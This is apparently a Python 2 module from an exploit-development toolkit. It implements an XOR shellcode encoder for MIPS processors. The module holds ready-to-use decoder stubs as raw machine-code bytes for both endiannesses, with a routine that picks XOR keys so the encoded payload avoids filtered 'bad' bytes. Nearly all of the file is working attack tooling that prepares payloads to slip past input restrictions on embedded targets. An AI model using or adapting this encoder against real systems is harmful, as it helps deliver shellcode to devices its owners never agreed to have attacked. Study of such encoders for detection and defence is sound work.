import string
import random
import struct
from ..encoders import EncoderException
from xorencoder import XorEncoder
from ..common.support import BigEndian,LittleEndian
from ..common.support import Logging
from ..common.support import pretty_string
from ..common.support import parse_badchars

class MipsXorEncoder(XorEncoder):
    """
    An XOR encoder for the MIPS CPU archictecture.  Supports big endian and small endian.
    """
    MAX_ATTEMPTS=10
    decoders={}
    decoders[LittleEndian] = string.join([ 
        "SIZ2SIZ1\x0e\x24",    # li t6,-5
        "\x27\x70\xc0\x01",    # nor	t6,t6,zero
        "\xa3\xff\x0b\x24",    # li	t3,-93
        "\x26\x40\xce\x01",    # xor	t0,t6,t6
        "\xff\xff\x08\x21",    # addi	t0,t0,-1
        "\xff\xff\x10\x05",    # bltzal	t0,14 <next>
        "\x82\x82\x08\x28",    # slti	t0,zero,-32126
        "\xe2\xff\xfd\x23",    # addi	sp,ra,-30
        "\x27\x58\x60\x01",    # nor	t3,t3,zero
        "\x21\xc8\xeb\x03",    # addu	t9,ra,t3
        "\x82\x82\x17\x28",    # slti	s7,zero,-32126
        "\xfc\xff\x31\x8f",    # lw	s1,-4(t9)
        "\xfb\xff\x0c\x24",    # li	t4,-5
        "\x27\x60\x80\x01",    # nor	t4,t4,zero
        "\xfd\xff\x8f\x21",    # addi	t7,t4,-3
        "\xfc\xff\x28\x8f",    # lw	t0,-4(t9)
        "\x21\xb8\xef\x02",    # addu	s7,s7,t7
        "\x26\x18\x11\x01",    # xor	v1,t0,s1
        "\x2b\xf0\xee\x02",    # sltu	s8,s7,t6
        "\xfc\xff\x23\xaf",    # sw	v1,-4(t9)
        "\xfa\xff\x1e\x14",    # bne	zero,s8,3c <loop>
        "\x21\xc8\x2c\x03",    # addu	t9,t9,t4
        "\xfd\xff\x86\x21",    # addi	a2,t4,-3
        "\xf8\xff\xa6\xaf",    # sw	a2,-8(sp)
        "\x26\x28\xce\x01",    # xor	a1,t6,t6
        "\xfc\xff\xa5\xaf",    # sw	a1,-4(sp)
        "\xf8\xff\xa4\x27",    # addiu	a0,sp,-8
        "\x46\x10\x02\x24",    # li v0,4166
        "\x0c\x54\x4a\x01"     # syscall   0x52950
        ],'')

    decoders[BigEndian] = string.join([ 
        "\x24\x0eSIZ1SIZ2",    # li	t6,-5
        "\x01\xc0\x70\x27",    # nor	t6,t6,zero
        "\x24\x0b\xff\xa3",    # li	t3,-93
        "\x01\xce\x40\x26",    # xor	t0,t6,t6
        "\x21\x08\xff\xff",    # addi	t0,t0,-1
        "\x05\x10\xff\xff",    # bltzal	t0,14 <next>
        "\x28\x08\x82\x82",    # slti	t0,zero,-32126
        "\x23\xfd\xff\xe2",    # addi	sp,ra,-30
        "\x01\x60\x58\x27",    # nor	t3,t3,zero
        "\x03\xeb\xc8\x21",    # addu	t9,ra,t3
        "\x28\x17\x82\x82",    # slti	s7,zero,-32126
        "\x8f\x31\xff\xfc",    # lw	s1,-4(t9)
        "\x24\x0c\xff\xfb",    # li	t4,-5
        "\x01\x80\x60\x27",    # nor	t4,t4,zero
        "\x21\x8f\xff\xfd",    # addi	t7,t4,-3
        "\x8f\x28\xff\xfc",    # lw	t0,-4(t9)
        "\x02\xef\xb8\x21",    # addu	s7,s7,t7
        "\x01\x11\x18\x26",    # xor	v1,t0,s1
        "\x02\xee\xf0\x2b",    # sltu	s8,s7,t6
        "\xaf\x23\xff\xfc",    # sw	v1,-4(t9)
        "\x14\x1e\xff\xfa",    # bne	zero,s8,3c <loop>
        "\x03\x2c\xc8\x21",    # addu	t9,t9,t4
        "\x21\x86\xff\xfd",    # addi	a2,t4,-3
        "\xaf\xa6\xff\xf8",    # sw	a2,-8(sp)
        "\x01\xce\x28\x26",    # xor	a1,t6,t6
        "\xaf\xa5\xff\xfc",    # sw	a1,-4(sp)
        "\x27\xa4\xff\xf8",    # addiu	a0,sp,-8
        "\x24\x02\x10\x46",    # li	v0,4166
        "\x01\x4a\x54\x0c"    # syscall	0x52950
        ],'') 
    def __has_badchars(self,data,badchars):
        badchar_list=[]
        for char in badchars:
            #print "Checking for char: "+str(char)
            if char in data:
                badchar_list.append(char)

        return badchar_list

        
    def __pack_key(self,key):
        if self.endianness==BigEndian:
            packed_key=struct.pack('>I',key)
        else:
            packed_key=struct.pack('<I',key)
        return packed_key
        
    #TODO: Does this need to be moved to superclass?
    def __generate_key(self,triedkeys,badchars):
        minbyte=0x01
        maxbyte=0xff
        key=0
        random.seed()
        
        #keep trying until we find an original key
        while True:
            self.logger.LOG_INFO("Generating key.")
            for i in range(0,4):
                while True:
                    byte=random.randint(minbyte,maxbyte)
                    if chr(byte) in badchars:
                        self.logger.LOG_DEBUG("bad byte when generating key : %#04x"% byte)
                    else:
                        break
                key=key | byte << (i * 8) 
            self.logger.LOG_DEBUG("Key: %#010x" % key)
            key=self.__pack_key(key)

            if not key in triedkeys:
                break
        
        return key


    def __init__(self,payload,endianness,badchars=[],key=None,logger=None):
        """
        Parameters
        ----------
        payload: The payload to be encoded.  Must have a 'shellcode' string.
        endianness: Endianness of the target system. (See the support.BigEndian
            and support.LittleEndian)
        badchars: Optional. List of restricted bytes that must be avoided.
        key: Optional.  The encoder key to use.  If provided, none will be
            generated.  If the payload encoded with this key contains bytes
            specified in badchars, an exception is raised.
        logger: Optional logger object. If none is provided, a logger will be
            instantiated with output to stdout.
            
        Raises EncoderException
        """
        
        
        if not logger:
            logger=Logging()

        self.logger=logger
        self.endianness=endianness
        self.badchars=parse_badchars(badchars)
        self.logger.LOG_DEBUG("bad char count: %d" % len(self.badchars))
        generate_key=False
        
        self.key=key

        if len(payload.shellcode) % 4 != 0:
            raise "Payload length must be a multiple of 4 bytes."
        
        size=(len(payload.shellcode)/4)+1
        if size > 0xffff:
            raise "Payload length %d is too long." % len(payload.shellcode)
        
        size = size ^ 0xffff
        
        sizelo=size & 0xff
        sizehi=size >> 8

        decoder=self.__class__.decoders[endianness]
        decoder=decoder.replace("SIZ1",chr(sizehi))
        decoder=decoder.replace("SIZ2",chr(sizelo)) #SIZ1SIZ2 == sizehisizelo
        decoder_badchars=self.__has_badchars(decoder,self.badchars)
        
        if len(decoder_badchars) > 0:
            raise EncoderException("Decoder stub contains bad bytes: %s" % str(decoder_badchars))
        self.logger.LOG_DEBUG("No bad bytes in decoder stub.")

        if not self.key:
            attempts=self.__class__.MAX_ATTEMPTS
        else:
            attempts=1
            self.key=self.__pack_key(self.key)
            key_badchars=self.__has_badchars(self.key,self.badchars)
            if(len(key_badchars) > 0):
                raise EncoderException("Provided XOR key has bad bytes: %s" % str(key_badchars))


        tried_keys=[self.key]

        while attempts > 0:
            if not self.key:
                self.key=self.__generate_key(tried_keys,self.badchars)
                tried_keys.append(self.key)
            
            encoded_shellcode=self.encode(payload.shellcode,self.key)
            encoded_badchars=self.__has_badchars(encoded_shellcode,self.badchars)

            if len(encoded_badchars) > 0:
                self.key=None
                attempts -= 1
            else:
                break
        
        if not self.key:
            raise Exception("Failed to encode payload without bad bytes.")
            
        self.shellcode=decoder+self.key+encoded_shellcode
    
    def pretty_string(self):
        return pretty_string(self.shellcode)
        
    def __str__(self):
        data=""
        for c in self.shellcode:
            data=data+"\\%c" % ord(c)

        return data

